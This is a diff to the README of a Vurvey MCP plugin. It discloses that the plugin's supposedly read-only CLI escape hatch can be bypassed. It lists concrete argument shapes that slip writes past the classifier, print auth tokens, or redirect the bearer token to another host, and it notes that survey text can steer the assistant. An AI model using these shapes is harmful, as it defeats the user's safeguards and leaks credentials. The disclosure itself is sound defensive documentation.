@@ -14,7 +14,7 @@ Works with **Claude Code**, **Claude Desktop**, **Cursor**, **Codex CLI**, and a
 
 Three pieces, and two things to understand about what moves where.
 
-**Your Vurvey login stays on your own machine.** Claude never sees your password, and Anthropic never receives your Vurvey token.
+**Your Vurvey login stays on your own machine.** Claude never sees your password, and no tool built for reading your workspace sends your Vurvey token anywhere but the Vurvey API. There is one exception, and it is the `vurvey_cli` escape hatch: see [What the read-only tier does and does not stop](#what-the-read-only-tier-does-and-does-not-stop).
 
 **Your Vurvey data does not stay on your machine.** Whatever a tool returns is inserted into the conversation and sent to the model provider, the same as text you paste in yourself. That is how Claude answers from it.
 
@@ -72,11 +72,11 @@ sequenceDiagram
 | Question | Answer |
 |---|---|
 | Does Claude see my password? | No. You type it into the CLI in your own terminal. |
-| Does my Vurvey token get sent to Anthropic? | No. It goes from your machine straight to the Vurvey API. |
+| Does my Vurvey token get sent to Anthropic? | Not by any tool built for reading your workspace. Those send it to the Vurvey API. `vurvey_docs_search` / `vurvey_docs_get` send it to a second host, the Vurvey documentation service, and on v0.19.2 and earlier a `VURVEY_DOCS_URL` in the server's environment redirects that request with no host check. The `vurvey_cli` escape hatch can also print the token into the transcript, which does reach the model provider: see [What the read-only tier does and does not stop](#what-the-read-only-tier-does-and-does-not-stop). |
 | Can Claude see data I can't? | No. The API applies the same permissions as your account and workspace. |
 | Does my workspace data get sent to Anthropic? | Yes. Every tool result is added to the conversation, so whatever a tool returns goes to the model provider along with the rest of the chat. |
 | What is in a tool result? | Whatever was asked for, verbatim. Respondent free text (`vurvey_answers_*`), workspace member names and email addresses (`vurvey_personas_members`), and anything your account can read through `vurvey_graphql_query`. Treat a tool call the way you would treat pasting that data into chat. |
-| Can Claude change things? | Not as shipped. This plugin runs read-only. Creating, updating, running, and deleting are all opt-in. See [What Claude can change](#what-claude-can-change). |
+| Can Claude change things? | Not through any tool built for it. The write and delete tools are not registered, and GraphQL mutations are refused. The `vurvey_cli` escape hatch is the gap, and it is a real one on released CLIs: see [What the read-only tier does and does not stop](#what-the-read-only-tier-does-and-does-not-stop). |
 | Do I need a Vurvey account? | Yes. This works against *your* workspace, so you need access to one. |
 
 ---
@@ -192,7 +192,7 @@ If no dedicated tool fits, Claude can call any `vurvey` CLI command directly thr
 
 Claude discovers what's available the same way you would, by asking the CLI for `--help`.
 
-As shipped the escape hatch runs read commands only. Anything that writes (`create`, `update`, `delete`, and friends) is refused with *"non-read command requires advanced tier"* until you raise the tier.
+The escape hatch is meant to run read commands only, and it refuses an ordinary write with *"non-read command requires advanced tier"*. Its read/write split is a heuristic rather than a gate, though, and on releases through v0.19.2 there are argument shapes that get past it. Read [What the read-only tier does and does not stop](#what-the-read-only-tier-does-and-does-not-stop) before you treat it as a boundary.
 
 <details>
 <summary>Full tool list</summary>
@@ -201,7 +201,7 @@ As shipped the escape hatch runs read commands only. Anything that writes (`crea
 
 | Group | Tools |
 |---|---|
-| Workspace | `workspace_overview`, `workspace_info`, `workspaces_list`, `whoami`, `environment_get`, `environments_list`, `cli` |
+| Workspace | `workspace_overview`, `workspace_info`, `workspaces_list`, `whoami`, `environment_get`, `environments_list` |
 | Surveys | `surveys_list`, `surveys_get`, `surveys_find_by_name` |
 | Questions | `questions_list`, `questions_get` |
 | Answers | `answers_list`, `answers_get`, `answers_search` |
@@ -215,6 +215,7 @@ As shipped the escape hatch runs read commands only. Anything that writes (`crea
 | Media | `clips_list`, `clips_get`, `files_get`, `file_tags_list` |
 | Engineering docs | `docs_search`, `docs_get` (staff-only, and enforced by the docs service, not the CLI: a customer's valid token reaches it and is refused) |
 | GraphQL | `graphql_query` (queries at every tier; mutations at `advanced`; delete-pattern mutations only at `destructive`), `graphql_introspect` |
+| Escape hatch | `cli` (any `vurvey` CLI subcommand). Registered here, but **not** a read-only tool: see [What the read-only tier does and does not stop](#what-the-read-only-tier-does-and-does-not-stop). |
 
 **Write** (not shipped on; requires `VURVEY_MCP_TIER=advanced`)
 
@@ -244,11 +245,11 @@ All names are prefixed `vurvey_`. `graphql_introspect` registers only against en
 
 ## What Claude can change
 
-The plugin ships at the **core** tier. Claude can read your workspace and nothing else. Writing and deleting are both opt-in, and you are the one who turns them on.
+The plugin ships at the **core** tier, pinned read-only. Writing and deleting are both opt-in, and you are the one who turns them on.
 
 | Tier | What you get | Setting |
 |---|---|---|
-| **core** *(what this plugin ships)* | 53 tools. Read-only. Claude can look, never touch. | nothing to do |
+| **core** *(what this plugin ships)* | 53 tools. No write or delete tool is registered, and GraphQL mutations are refused. | nothing to do |
 | advanced | 82 tools. Everything above, plus create, update, run, schedule, and switch. | `VURVEY_MCP_TIER=advanced` |
 | destructive | 86 tools. Also registers the four delete tools and allows `deleteX` GraphQL mutations. | `advanced` plus `VURVEY_MCP_ALLOW_DESTRUCTIVE=1` |
 
@@ -258,7 +259,35 @@ Counts measured against `vurvey` v0.19.2 by sending `tools/list` to `vurvey mcp 
 
 **Why deletes are off.** Everything at `advanced` is recoverable — a workflow you didn't want can be paused, an edit can be re-edited. Deletes aren't. Since Claude is acting on an interpretation of what you asked, the one class of mistake worth a speed bump is the irreversible one. Turn it on if you need it; it's one line.
 
-**What protects you at `core`:** two things. The API enforces your own account permissions, so Claude cannot reach anything you couldn't reach yourself. And nothing registered on this tier can create, update, run, or delete. Moving to `advanced` removes the second one and leaves you relying on your client's approval prompt.
+### What the read-only tier does and does not stop
+
+Read this before you rely on `core` as a boundary. It is measured against v0.19.2, the current release.
+
+**What it does stop, and does so by construction:**
+
+- The write tools and the four delete tools are not registered. They are absent from `tools/list`, so there is nothing for the model to call.
+- `vurvey_graphql_query` refuses any document whose first operation keyword is `mutation`.
+- With `VURVEY_MCP_READ_ONLY=1` pinned alongside the tier, both of those hold even if the tier value is wrong.
+
+**What it does not stop.** `vurvey_cli` is registered at `core`, and its read-versus-write decision is a heuristic over the argument list rather than a gate. Running the released classifier directly, every one of these is allowed at `core`:
+
+```
+["surveys", "create", "--name", "list"]                   -> allowed
+["workflows", "run", "--id", "list"]                      -> allowed
+["workspaces", "create", "--name", "help"]                -> allowed
+["config", "get", "token", "--reveal"]                    -> allowed
+["--api-url", "https://example.com", "surveys", "list"]   -> allowed
+```
+
+Three separate causes. The classifier scans every token for a read verb and stops at the first match, so a read verb sitting in a flag **value** launders a mutation. A `help` token anywhere returns allowed before the blocklist and both tier checks run. And the subcommand is identified as the first token not starting with `-`, so a leading `--api-url` is read as the subcommand and points the subprocess at another host while it still carries your session bearer token. `config get token --reveal` classifies as a read and prints your auth and refresh tokens, which then become a tool result and go to the model provider like any other.
+
+`VURVEY_MCP_READ_ONLY=1` does not close this. It gates tool **registration** by tier, and `vurvey_cli` is a core tool, so it stays registered and the classifier stays in charge.
+
+This matters more, not less, because respondent free text reaches the model (see the table at the top). Text in your survey data that tries to steer the assistant is reaching one that has been told this tool cannot write.
+
+**So the real boundary at `core` is your own account's permissions on the Vurvey API,** plus the fact that nothing here is trying to get past the classifier. Treat "read-only" as the shape of the tool surface, not as a guarantee about the subprocess. The CLI fix that stops registering `vurvey_cli` unless `VURVEY_MCP_UNSAFE_LOCAL=1` is on the CLI's main branch and is not in any release yet; this section comes out when it ships.
+
+**What changes at `advanced`.** The write tools register and mutations are allowed, so the tool surface stops being the constraint at all and you are relying on your client's approval prompt.
 
 **Do not lean on that prompt.** Clients do prompt before a tool call by default, but ordinary settings switch it off, and then a write happens with no confirmation:
 
@@ -364,12 +393,15 @@ Prefer `--profile` over `--api-url` for anything involving credentials. Profiles
 
 ## Requirements
 
-- `vurvey` CLI **v0.19.1 or newer** on `$PATH`. Earlier releases register the four delete tools at the `advanced` tier, so `VURVEY_MCP_ALLOW_DESTRUCTIVE` gated nothing for them and the "deletes are off" promise in these docs was false. v0.19.1 is the release that fixed it.
+- `vurvey` CLI **v0.19.1 or newer** on `$PATH`, and **v0.19.2** is the current release. v0.19.1 is the floor because earlier releases register the four delete tools at the `advanced` tier, so `VURVEY_MCP_ALLOW_DESTRUCTIVE` gated nothing for them and the "deletes are off" promise in these docs was false. Note that v0.19.2 does **not** close the `vurvey_cli` escape hatch described in [What the read-only tier does and does not stop](#what-the-read-only-tier-does-and-does-not-stop), and neither does `VURVEY_MCP_READ_ONLY=1`.
 - A Vurvey account and workspace — [vurvey.com](https://vurvey.com)
 
 **Nothing warns you on a version mismatch.** The plugin does not check the binary's version and MCP does not negotiate one, so an older CLI just answers with a different tool set. The symptoms are a tool documented here missing from `/mcp`, or counts that don't match what `/mcp` shows. Run `vurvey --version` in a terminal, or ask Claude to call `vurvey_environment_get`, to see which binary is answering, then `vurvey update` and `/mcp restart vurvey`.
 
-**Known gap at the time of writing.** `vurvey_capability_blueprints_list` fails on every release through v0.19.2 with `Variable "$wsId" of type "ID!" used in position expecting type "GUID!"`. The fix is on the CLI's main branch and ships in the next release. No released version delivers everything documented here.
+**Known gaps at the time of writing.** No released version delivers everything documented here.
+
+- The `vurvey_cli` escape hatch is registered at `core` and its read/write classifier can be defeated by a read verb in a flag value, a `help` token anywhere in the argument list, or a leading `--api-url`. Details and the exact argument shapes are in [What the read-only tier does and does not stop](#what-the-read-only-tier-does-and-does-not-stop). Fixed on the CLI's main branch, unreleased.
+- `vurvey_capability_blueprints_list` fails on every release through v0.19.2 with `Variable "$wsId" of type "ID!" used in position expecting type "GUID!"`. Fixed on the CLI's main branch, unreleased.
 
 ## Contributing
 
